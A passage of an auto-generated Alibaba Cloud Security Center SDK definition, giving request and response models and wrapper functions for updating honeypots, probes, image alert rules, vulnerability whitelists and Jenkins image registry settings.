    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='webpage'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='hyl-phpmyadmin'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='868a7579-00b5-4a74-999d-8bd3f411e8a3'),
    state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
  }(name='Data', description='The information about the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B323ADD-6CF8-51F6-9047-2F0A4E3F5EFD'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateHoneypotResponseBody(name='body'),
}

/**
 * @summary Modifies the configuration of a specified honeypot.
 *
 * @param request UpdateHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateHoneypotResponse
 */
async function updateHoneypotWithOptions(request: UpdateHoneypotRequest, runtime: Util.RuntimeOptions): UpdateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configuration of a specified honeypot.
 *
 * @param request UpdateHoneypotRequest
 * @return UpdateHoneypotResponse
 */
async function updateHoneypot(request: UpdateHoneypotRequest): UpdateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotWithOptions(request, runtime);
}

model UpdateHoneypotNodeRequest {
  availableProbeNum?: int32(name='AvailableProbeNum', description='The number of available probes.

This parameter is required.', example='20'),
  nodeId?: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.

This parameter is required.', example='67ab3f4c-3db5-4fc3-b51f-00f8bfabfa08'),
  nodeName?: string(name='NodeName', description='The name of the management node.

This parameter is required.', example='HoneypotNodeTest'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The CIDR blocks that are allowed to access the management node.'),
}

model UpdateHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='753D92B3-A062-544F-8E7B-C813AA9FA9FC'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateHoneypotNodeResponseBody(name='body'),
}

/**
 * @summary Modifies the configuration of a specified management node.
 *
 * @param request UpdateHoneypotNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateHoneypotNodeResponse
 */
async function updateHoneypotNodeWithOptions(request: UpdateHoneypotNodeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configuration of a specified management node.
 *
 * @param request UpdateHoneypotNodeRequest
 * @return UpdateHoneypotNodeResponse
 */
async function updateHoneypotNode(request: UpdateHoneypotNodeRequest): UpdateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotNodeWithOptions(request, runtime);
}

model UpdateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='metabase'),
  honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.

> You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.

This parameter is required.', example='f75eddce-e9d3-4a88-af95-b10b6f65xxxx'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  meta?: string(name='Meta', description='The custom configurations of the honeypot template. The value is a JSON string that contains the following fields:

*   **portrait_option**: Social Source Tracing
*   **burp**: Burp-specific Defense
*   **trojan_git**: Git-specific Defense', example='{"portrait_option":true,"burp":"open"}'),
  presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='apc_web_python'),
}

model UpdateHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='60922C83-6B19-5A57-8F13-4663C6D391F4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotPresetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateHoneypotPresetResponseBody(name='body'),
}

/**
 * @summary Modifies the configurations of the specified honeypot template.
 *
 * @param request UpdateHoneypotPresetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateHoneypotPresetResponse
 */
async function updateHoneypotPresetWithOptions(request: UpdateHoneypotPresetRequest, runtime: Util.RuntimeOptions): UpdateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configurations of the specified honeypot template.
 *
 * @param request UpdateHoneypotPresetRequest
 * @return UpdateHoneypotPresetResponse
 */
async function updateHoneypotPreset(request: UpdateHoneypotPresetRequest): UpdateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotPresetWithOptions(request, runtime);
}

model UpdateHoneypotProbeRequest {
  arp?: boolean(name='Arp', description='Specifies whether address resolution protocol (ARP) is enabled for the check type.', example='false'),
  displayName?: string(name='DisplayName', description='The name of the probe.', example='svwsx-vpc-4430'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  ping?: boolean(name='Ping', description='Specifies whether ping is enabled for the check type.', example='true'),
  probeId?: string(name='ProbeId', description='The ID of the probe.

> You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.

This parameter is required.', example='bbe7e382-956f-473e-beed-bc73a258****'),
  serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.'),
}

model UpdateHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AB62FFAA-E1A5-5D7C-8D97-0F16C6A6F520'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model UpdateHoneypotProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateHoneypotProbeResponseBody(name='body'),
}

/**
 * @summary Modifies the attributes of a specified probe.
 *
 * @param request UpdateHoneypotProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateHoneypotProbeResponse
 */
async function updateHoneypotProbeWithOptions(request: UpdateHoneypotProbeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  if (!Util.isUnset(request.serviceIpList)) {
    query['ServiceIpList'] = request.serviceIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the attributes of a specified probe.
 *
 * @param request UpdateHoneypotProbeRequest
 * @return UpdateHoneypotProbeResponse
 */
async function updateHoneypotProbe(request: UpdateHoneypotProbeRequest): UpdateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotProbeWithOptions(request, runtime);
}

model UpdateHoneypotProbeBindRequest {
  bindId?: string(name='BindId', description='The unique ID of the honeypot to which the probe is bound.', example='f52e8624-e43c-473c-8312-e0fed384****'),
  bindPortList?: [ 
    {
      bindPort?: boolean(name='BindPort', description='Specifies whether to bind a port. Valid values:

*   **true**
*   **false**', example='false'),
      endPort?: int32(name='EndPort', description='The end port on which the probe monitors.', example='81'),
      fixed?: boolean(name='Fixed', description='Specifies whether the port is fixed. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      id?: long(name='Id', description='The UUID of the port.', example='3183'),
      proto?: string(name='Proto', description='The type of the protocol. Valid values:

*   **tcp**
*   **udp**', example='tcp'),
      startPort?: int32(name='StartPort', description='The start port on which the probe monitors.', example='81'),
      targetPort?: int32(name='TargetPort', description='The destination port.', example='80'),
    }
  ](name='BindPortList', description='The ports that are bound to the probe.'),
  bindType?: string(name='BindType', description='The operation that the probe performs. Valid values:

*   **forward_honey**: forward traffic to a honeypot
*   **scan_port**: monitor and scan', example='forward_honey'),
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page **1**. Default value: **1**.', example='1'),
  honeypotId?: string(name='HoneypotId', description='The honeypot ID.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to obtain the IDs of honeypots.', example='dba7d44775be8e0e5888ee3b1a62554a93d2512247cabc38ddeac17a3b3f****'),
  id?: long(name='Id', description='The port ID of the probe service.', example='1906'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned per page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  ports?: string(name='Ports', description='The ports that are monitored.', example='{\\\\"tcp\\\\":\\\\"1-65535\\\\",\\\\"udp\\\\":\\\\"1-65535\\\\"}'),
  probeId?: string(name='ProbeId', description='The probe ID.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='36bad711-d1ac-4419-ac68-c1aa280f****'),
  serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.'),
  setStatus?: int32(name='SetStatus', description='The status of the port.', example='0'),
}

model UpdateHoneypotProbeBindResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='425D9617-4F4F-571E-A9CF-0245C9FC****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UpdateHoneypotProbeBindResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateHoneypotProbeBindResponseBody(name='body'),
}

/**
 * @summary Modifies a probe service.
 *
 * @param request UpdateHoneypotProbeBindRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateHoneypotProbeBindResponse
 */
async function updateHoneypotProbeBindWithOptions(request: UpdateHoneypotProbeBindRequest, runtime: Util.RuntimeOptions): UpdateHoneypotProbeBindResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bindId)) {
    query['BindId'] = request.bindId;
  }
  if (!Util.isUnset(request.bindPortList)) {
    query['BindPortList'] = request.bindPortList;
  }
  if (!Util.isUnset(request.bindType)) {
    query['BindType'] = request.bindType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ports)) {
    query['Ports'] = request.ports;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  if (!Util.isUnset(request.serviceIpList)) {
    query['ServiceIpList'] = request.serviceIpList;
  }
  if (!Util.isUnset(request.setStatus)) {
    query['SetStatus'] = request.setStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotProbeBind',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a probe service.
 *
 * @param request UpdateHoneypotProbeBindRequest
 * @return UpdateHoneypotProbeBindResponse
 */
async function updateHoneypotProbeBind(request: UpdateHoneypotProbeBindRequest): UpdateHoneypotProbeBindResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotProbeBindWithOptions(request, runtime);
}

model UpdateHybridProxyRequest {
  proxyUuid?: string(name='ProxyUuid', description='The UUID of the Security Center agent.

This parameter is required.', example='inet-proxy-14bbbb37-c4b9-4e86-83bd-137a940a6ec4'),
}

model UpdateHybridProxyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='C0DD0616-0DA0-5450-B89E-F30D49E63D6B'),
}

model UpdateHybridProxyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateHybridProxyResponseBody(name='body'),
}

/**
 * @summary Updates the Security Center agent that is installed on a proxy server in a hybrid cloud.
 *
 * @param request UpdateHybridProxyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateHybridProxyResponse
 */
async function updateHybridProxyWithOptions(request: UpdateHybridProxyRequest, runtime: Util.RuntimeOptions): UpdateHybridProxyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.proxyUuid)) {
    query['ProxyUuid'] = request.proxyUuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHybridProxy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates the Security Center agent that is installed on a proxy server in a hybrid cloud.
 *
 * @param request UpdateHybridProxyRequest
 * @return UpdateHybridProxyResponse
 */
async function updateHybridProxy(request: UpdateHybridProxyRequest): UpdateHybridProxyResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHybridProxyWithOptions(request, runtime);
}

model UpdateImageEventOperationRequest {
  conditions?: string(name='Conditions', description='The rule conditions. Specify a value in the JSON format. You can specify the following keys:

*   **condition**: the matching condition.
*   **type**: the matching type.
*   **value**: the matching value.', example='[{\\\\"condition\\\\": \\\\"MD5\\\\", \\\\"type\\\\": \\\\"equals\\\\", \\\\"value\\\\": \\\\"0083a31cc0083a31ccf7c10367a6e****\\\\"}]'),
  id?: long(name='Id', description='The ID of the alert handling rule. 
> You can call the [DescribeImageEventOperationPage](~~DescribeImageEventOperationPage~~) operation to query the ID.', example='814163'),
  note?: string(name='Note', description='The remarks that you want to add.', example='test'),
  scenarios?: string(name='Scenarios', description='The application scope of the rule. The value is in the JSON format. Valid values:

*   **type**
*   **value**', example='{\\\\"type\\\\": \\\\"repo\\\\", \\\\"value\\\\": \\\\"test-aaa/shenzhen-repo-01\\\\"}'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:

*   **image**: image.
*   **agentless**: agentless detection.', example='agentless'),
}

model UpdateImageEventOperationResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    id?: long(name='Id', description='The ID of the alert handling rule, which is the same as the value of the Id request parameter.', example='67429'),
  }(name='Data', description='The data returned.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UpdateImageEventOperationResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateImageEventOperationResponseBody(name='body'),
}

/**
 * @summary Updates an alert handling rule.
 *
 * @param request UpdateImageEventOperationRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateImageEventOperationResponse
 */
async function updateImageEventOperationWithOptions(request: UpdateImageEventOperationRequest, runtime: Util.RuntimeOptions): UpdateImageEventOperationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.conditions)) {
    query['Conditions'] = request.conditions;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.note)) {
    query['Note'] = request.note;
  }
  if (!Util.isUnset(request.scenarios)) {
    query['Scenarios'] = request.scenarios;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateImageEventOperation',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates an alert handling rule.
 *
 * @param request UpdateImageEventOperationRequest
 * @return UpdateImageEventOperationResponse
 */
async function updateImageEventOperation(request: UpdateImageEventOperationRequest): UpdateImageEventOperationResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateImageEventOperationWithOptions(request, runtime);
}

model UpdateImageVulWhitelistTargetRequest {
  id?: long(name='Id', description='The whitelist ID.', example='2000083'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reason?: string(name='Reason', description='The reason why you add the vulnerability to the whitelist.', example='ignore'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:

*   **image**
*   **agentless**', example='image'),
  target?: string(name='Target', description='The vulnerability that you want to add to the whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: The type of the vulnerability. The value is fixed to repo.
*   **target**: The content of the vulnerability. The value is in the format of Namespace/Image repository.', example='{\\\\"type\\\\":\\\\"repo\\\\",\\\\"target\\\\":[\\\\"sas_test/script_0209\\\\",\\\\"sas_test/script\\\\"]}'),
}

model UpdateImageVulWhitelistTargetResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether the image vulnerability is added to the whitelist. Valid values:

*   **true**
*   **false**', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='9F4E6157-9600-5588-86B9-38F09067****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UpdateImageVulWhitelistTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateImageVulWhitelistTargetResponseBody(name='body'),
}

/**
 * @summary Updates the vulnerability whitelist of an image.
 *
 * @param request UpdateImageVulWhitelistTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateImageVulWhitelistTargetResponse
 */
async function updateImageVulWhitelistTargetWithOptions(request: UpdateImageVulWhitelistTargetRequest, runtime: Util.RuntimeOptions): UpdateImageVulWhitelistTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateImageVulWhitelistTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates the vulnerability whitelist of an image.
 *
 * @param request UpdateImageVulWhitelistTargetRequest
 * @return UpdateImageVulWhitelistTargetResponse
 */
async function updateImageVulWhitelistTarget(request: UpdateImageVulWhitelistTargetRequest): UpdateImageVulWhitelistTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateImageVulWhitelistTargetWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryNameRequest {
  registryId?: long(name='RegistryId', description='The ID of the image repository.

> You can call the [PageImageRegistry](~~PageImageRegistry~~) operation to query the IDs of image repositories.', example='25090'),
  registryName?: string(name='RegistryName', description='The name of the image repository.', example='a0603tk1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.33.XXX.XXX'),
}

model UpdateJenkinsImageRegistryNameResponseBody = {
  data?: boolean(name='Data', description='The result of the operation. Valid values:

*   **true**: successful
*   **false**: failed', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4347E985-6E64-467B-96EC-30D4EA9E****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model UpdateJenkinsImageRegistryNameResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateJenkinsImageRegistryNameResponseBody(name='body'),
}

/**
 * @summary Modifies the name of a Jenkins image repository.
 *
 * @param request UpdateJenkinsImageRegistryNameRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateJenkinsImageRegistryNameResponse
 */
async function updateJenkinsImageRegistryNameWithOptions(request: UpdateJenkinsImageRegistryNameRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the name of a Jenkins image repository.
 *
 * @param request UpdateJenkinsImageRegistryNameRequest
 * @return UpdateJenkinsImageRegistryNameResponse
 */
async function updateJenkinsImageRegistryName(request: UpdateJenkinsImageRegistryNameRequest): UpdateJenkinsImageRegistryNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryNameWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryPersistenceDayRequest {
  persistenceDay?: int32(name='PersistenceDay', description='The retention period. Unit: days.', example='30'),
  registryId?: long(name='RegistryId', description='The ID of the image repository.

> You can call the [PageImageRegistry](~~PageImageRegistry~~) operation to query the IDs of image repositories.', example='25363'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='106.11.XXX.XXX'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='69F88BA1-004C-51E2-BF5C-A3220E5A****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

/**
 * @summary Modifies the retention period of images that are stored in a Jenkins image repository.
 *
 * @param request UpdateJenkinsImageRegistryPersistenceDayRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateJenkinsImageRegistryPersistenceDayResponse
 */
async function updateJenkinsImageRegistryPersistenceDayWithOptions(request: UpdateJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
